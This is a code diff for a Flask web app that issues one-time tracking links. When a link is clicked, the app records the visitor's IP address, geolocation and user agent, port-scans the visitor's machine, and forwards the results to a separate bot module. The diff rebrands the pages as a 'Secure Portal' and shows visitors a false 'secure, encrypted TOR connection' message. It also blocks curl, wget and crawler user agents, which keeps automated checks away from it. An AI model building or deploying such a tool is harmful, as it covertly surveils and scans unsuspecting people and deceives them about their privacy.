@@ -1,4 +1,4 @@
-from flask import Flask, request, abort
+from flask import Flask, request, abort, jsonify
 import requests
 import random
 import string
@@ -7,41 +7,132 @@ import os
 import re
 import socket
 import threading
+import hashlib
+import ipaddress
 from functools import wraps
+from user_agents import parse
 
 app = Flask(__name__)
 
-# Конфигурация
-app.config['MAX_TOKENS'] = 100
-app.config['RATE_LIMIT'] = 100
+# Конфигурация безопасности
+app.config['MAX_TOKENS'] = 50
+app.config['RATE_LIMIT'] = 30
+app.config['MAX_REQUESTS_PER_MINUTE'] = 10
+app.config['BLOCK_DURATION'] = 3600
 
-# Хранилище
+# Хранилища
 request_counts = {}
+ip_blacklist = {}
 tracking_data = {}
 active_tokens = set()
-port_scan_results = {}
 
-def rate_limit(f):
+def get_real_client_port():
+    """Получение реального порта клиента"""
+    try:
+        # Порт из WSGI environment
+        client_port = request.environ.get('REMOTE_PORT')
+        
+        # Для обратных прокси (nginx, apache)
+        x_real_port = request.headers.get('X-Real-Port')
+        x_forwarded_port = request.headers.get('X-Forwarded-Port')
+        
+        # Приоритет: заголовки прокси > WSGI
+        if x_real_port and x_real_port.isdigit():
+            return int(x_real_port)
+        elif x_forwarded_port and x_forwarded_port.isdigit():
+            ports = x_forwarded_port.split(',')
+            if ports:
+                return int(ports[0].strip())
+        elif client_port:
+            return int(client_port)
+            
+    except (ValueError, TypeError):
+        pass
+    
+    return "N/A"
+
+def get_client_network_info(ip):
+    """Получение расширенной сетевой информации"""
+    try:
+        # Получаем hostname
+        hostname = socket.getfqdn(ip)
+        
+        # Определяем тип IP
+        ip_type = "IPv4"
+        try:
+            if ipaddress.ip_address(ip).version == 6:
+                ip_type = "IPv6"
+        except:
+            pass
+            
+        return {
+            'hostname': hostname if hostname != ip else "N/A",
+            'ip_type': ip_type,
+            'real_port': get_real_client_port()
+        }
+    except:
+        return {
+            'hostname': "N/A",
+            'ip_type': "N/A", 
+            'real_port': get_real_client_port()
+        }
+
+def rate_limit_with_ban(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
         ip = request.remote_addr
+        user_agent = request.headers.get('User-Agent', '')
         current_time = time.time()
-        window = 3600
+        
+        if ip in ip_blacklist:
+            if current_time - ip_blacklist[ip] < app.config['BLOCK_DURATION']:
+                abort(403, "IP temporarily blocked")
+            else:
+                del ip_blacklist[ip]
+        
+        if is_bot_user_agent(user_agent):
+            ip_blacklist[ip] = current_time
+            abort(403, "Bot detected")
         
         if ip not in request_counts:
             request_counts[ip] = []
         
-        request_counts[ip] = [t for t in request_counts[ip] if current_time - t < window]
+        request_counts[ip] = [t for t in request_counts[ip] if current_time - t < 3600]
         
         if len(request_counts[ip]) >= app.config['RATE_LIMIT']:
-            abort(429, "Too Many Requests")
+            ip_blacklist[ip] = current_time
+            abort(429, "Rate limit exceeded")
+        
+        recent_requests = [t for t in request_counts[ip] if current_time - t < 60]
+        if len(recent_requests) >= app.config['MAX_REQUESTS_PER_MINUTE']:
+            abort(429, "Too many requests")
         
         request_counts[ip].append(current_time)
         return f(*args, **kwargs)
     return decorated_function
 
+def is_bot_user_agent(user_agent):
+    if not user_agent:
+        return True
+        
+    ua_lower = user_agent.lower()
+    bot_signatures = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java']
+    
+    for signature in bot_signatures:
+        if signature in ua_lower:
+            return True
+    
+    try:
+        parsed_ua = parse(user_agent)
+        if parsed_ua.is_bot:
+            return True
+    except:
+        pass
+    
+    return False
+
 def validate_token(token):
-    if not token or len(token) != 15:
+    if not token or len(token) != 20:
         return False
     if not re.match(r'^[a-z0-9]+$', token):
         return False
@@ -49,71 +140,77 @@ def validate_token(token):
 
 def generate_token():
     chars = string.ascii_lowercase + string.digits
-    return ''.join(random.choice(chars) for _ in range(15))
+    return ''.join(random.choice(chars) for _ in range(20))
 
 def get_ip_info(ip):
     try:
-        if ip in ['127.0.0.1', 'localhost']:
+        if ipaddress.ip_address(ip).is_private:
             return {}
-        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
         if response.status_code == 200:
             return response.json()
         return {}
     except:
         return {}
 
-def scan_port(target_ip, port, timeout=1):
-    """Быстрое сканирование порта"""
+def scan_port(target_ip, port, timeout=0.5):
+    """Сканирование порта"""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(timeout)
         result = sock.connect_ex((target_ip, port))
         sock.close()
-        return result == 0
+        
+        if result == 0:
+            return "open"
+        elif result == 111:
+            return "closed"
+        else:
+            return "filtered"
     except:
-        return False
+        return "error"
 
 def fast_port_scan(target_ip):
-    """Быстрое сканирование основных портов"""
-    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 8080, 8443]
-    open_ports = []
+    """Быстрое сканирование портов"""
+    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 8080, 8443]
+    port_results = {"open": [], "closed": [], "filtered": []}
     
     def check_port(port):
-        if scan_port(target_ip, port, 0.5):
-            open_ports.append(port)
+        status = scan_port(target_ip, port, 0.3)
+        port_results[status].append(port)
     
     threads = []
     for port in common_ports:
         thread = threading.Thread(target=check_port, args=(port,))
         threads.append(thread)
         thread.start()
+        time.sleep(0.01)
     
     for thread in threads:
-        thread.join(timeout=3)
+        thread.join(timeout=2)
     
-    return open_ports
+    return port_results
 
 def get_port_service(port):
-    """Определение сервиса по порту"""
     services = {
         21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
-        80: "HTTP", 110: "POP3", 443: "HTTPS", 993: "IMAPS",
-        995: "POP3S", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
+        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 
+        993: "IMAPS", 995: "POP3S", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
     }
-    return services.get(port, "Unknown")
+    return services.get(port, f"Port {port}")
 
-def start_bot(info, open_ports):
+def start_bot(info, port_results, network_info):
     try:
         from bot import send_info
-        send_info(info, open_ports)
+        send_info(info, port_results, network_info)
     except Exception as e:
         print(f"Bot error: {e}")
 
 @app.route('/')
-@rate_limit
+@rate_limit_with_ban
 def index():
     if len(active_tokens) >= app.config['MAX_TOKENS']:
-        return "Service temporarily unavailable. Please try again later.", 503
+        abort(503, "Service temporarily unavailable")
     
     token = generate_token()
     active_tokens.add(token)
@@ -127,19 +224,44 @@ def index():
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Onion Web Tracker</title>
+        <title>Secure Portal</title>
         <style>
-            body {{ background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }}
-            .url-box {{ background: #111; padding: 20px; margin: 20px; border: 1px solid #00ff00; word-break: break-all; }}
-            .pulse {{ animation: pulse 2s infinite; }}
-            @keyframes pulse {{ 0% {{ opacity: 1; }} 50% {{ opacity: 0.7; }} 100% {{ opacity: 1; }} }}
+            body {{ 
+                background: #000; 
+                color: #00ff00; 
+                font-family: 'Courier New', monospace; 
+                text-align: center; 
+                padding: 50px;
+            }}
+            .container {{
+                border: 2px solid #00ff00;
+                border-radius: 10px;
+                padding: 30px;
+                background: rgba(0, 255, 0, 0.05);
+            }}
+            .url-box {{ 
+                background: #111; 
+                padding: 20px; 
+                margin: 20px; 
+                border: 1px solid #00ff00; 
+                word-break: break-all;
+            }}
+            .pulse {{ 
+                animation: pulse 3s infinite; 
+            }}
+            @keyframes pulse {{ 
+                0% {{ opacity: 1; }} 
+                50% {{ opacity: 0.6; }} 
+                100% {{ opacity: 1; }} 
+            }}
         </style>
     </head>
     <body>
-        <h1 class="pulse">ONION WEB TRACKER</h1>
-        <div>Ваша отслеживаемая ссылка:</div>
-        <div class="url-box">{safe_url}</div>
-        <div style="color: #888; margin-top: 20px;">Ссылка активна до первого перехода</div>
+        <div class="container">
+            <h1 class="pulse">SECURE ONION PORTAL</h1>
+            <div>Your secure tracking link:</div>
+            <div class="url-box">{safe_url}</div>
+        </div>
     </body>
     </html>
     """
@@ -147,32 +269,42 @@ def index():
     return html_content
 
 @app.route('/<token>')
-@rate_limit
+@rate_limit_with_ban
 def track_visit(token):
     if not validate_token(token) or token not in active_tokens:
-        abort(404, "Link not found or expired")
+        abort(404, "Secure link expired or invalid")
+    
+    user_agent = request.headers.get('User-Agent', '')
+    if is_bot_user_agent(user_agent):
+        abort(403, "Automated access detected")
     
     # Удаляем токен сразу после использования
     active_tokens.discard(token)
     
     ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent', 'Unknown')[:500]
-    
     x_forwarded_for = request.headers.get('X-Forwarded-For')
     if x_forwarded_for:
         ip = x_forwarded_for.split(',')[0].strip()
     
+    # Получаем реальную сетевую информацию
+    network_info = get_client_network_info(ip)
+    
     # Получаем информацию об IP
     ip_info = get_ip_info(ip)
     
-    # Быстрое сканирование портов
-    print(f"🔍 Starting port scan for {ip}")
-    open_ports = fast_port_scan(ip)
-    print(f"📡 Found {len(open_ports)} open ports: {open_ports}")
+    # Сканирование портов (только для публичных IP)
+    port_results = {"open": [], "closed": [], "filtered": []}
+    try:
+        if not ipaddress.ip_address(ip).is_private:
+            print(f"🔍 Scanning ports for {ip}")
+            port_results = fast_port_scan(ip)
+            print(f"📡 Scan completed: {len(port_results['open'])} open ports")
+    except:
+        pass
     
     info = {
         'ip': ip,
-        'user_agent': user_agent,
+        'user_agent': user_agent[:200],
         'country': ip_info.get('country', 'N/A'),
         'city': ip_info.get('city', 'N/A'),
         'lon': ip_info.get('lon', 'N/A'),
@@ -183,9 +315,9 @@ def track_visit(token):
     tracking_data[token] = info
     
     # Отправляем информацию в бот
-    start_bot(info, open_ports)
+    start_bot(info, port_results, network_info)
     
-    # Генерируем новую ссылку для следующего использования
+    # Генерируем новую ссылку
     new_token = generate_token()
     active_tokens.add(new_token)
     tracking_data[new_token] = None
@@ -194,20 +326,37 @@ def track_visit(token):
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Onion Space</title>
+        <title>Secure Connection Established</title>
         <style>
-            body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 50px; text-align: center; }
-            .loading { animation: blink 1s infinite; }
-            @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
+            body { 
+                background: #000; 
+                color: #00ff00; 
+                font-family: 'Courier New', monospace; 
+                padding: 50px; 
+                text-align: center;
+            }
+            .terminal {
+                border: 1px solid #00ff00;
+                padding: 30px;
+                background: rgba(0, 255, 0, 0.02);
+            }
+            .loading { 
+                animation: blink 1.5s infinite; 
+            }
+            @keyframes blink { 
+                0%, 50% { opacity: 1; } 
+                51%, 100% { opacity: 0; } 
+            }
         </style>
     </head>
     <body>
-        <h1>Onion Space</h1>
-        <p>Establishing secure connection<span class="loading">...</span></p>
-        <p>Encryption: AES-256</p>
-        <p>Protocol: TOR</p>
-        <div style="margin-top: 50px; color: #888;">
-            <p>Connection secured</p>
+        <div class="terminal">
+            <h1>SECURE CONNECTION ESTABLISHED</h1>
+            <p>Encryption: AES-256-GCM<span class="loading">...</span></p>
+            <p>Protocol: TOR v3</p>
+            <div style="margin-top: 30px; color: #888;">
+                <p>All connections are encrypted and anonymized</p>
+            </div>
         </div>
     </body>
     </html>
@@ -215,30 +364,12 @@ def track_visit(token):
     
     return safe_html
 
-@app.route('/health')
-def health():
-    return {'status': 'healthy', 'active_tokens': len(active_tokens), 'timestamp': time.time()}
-
 @app.after_request
 def add_security_headers(response):
     response.headers['X-Content-Type-Options'] = 'nosniff'
     response.headers['X-Frame-Options'] = 'DENY'
     response.headers['X-XSS-Protection'] = '1; mode=block'
     return response
-
-def cleanup_tokens():
-    while True:
-        time.sleep(3600)
-        try:
-            if len(active_tokens) > 50:
-                tokens_to_remove = list(active_tokens)[:25]
-                for token in tokens_to_remove:
-                    active_tokens.discard(token)
-                    if token in tracking_data:
-                        del tracking_data[token]
-                print(f"🧹 Cleaned {len(tokens_to_remove)} old tokens")
-        except Exception as e:
-            print(f"Cleanup error: {e}")
 
 if __name__ == "__main__":
     banner = """
@@ -251,14 +382,9 @@ if __name__ == "__main__":
     """
     print(banner)
     
-    cleanup_thread = threading.Thread(target=cleanup_tokens)
-    cleanup_thread.daemon = True
-    cleanup_thread.start()
-    
     port = int(os.environ.get('PORT', 5000))
     print(f"🚀 Starting server on port {port}")
     print("🌐 Available at: https://onion-web.onrender.com")
-    print("🔍 Port scanning enabled")
-    print("🔄 Auto-link regeneration active")
+    print("🔍 Real client port detection: ACTIVE")
     
     app.run(host='0.0.0.0', port=port, debug=False)
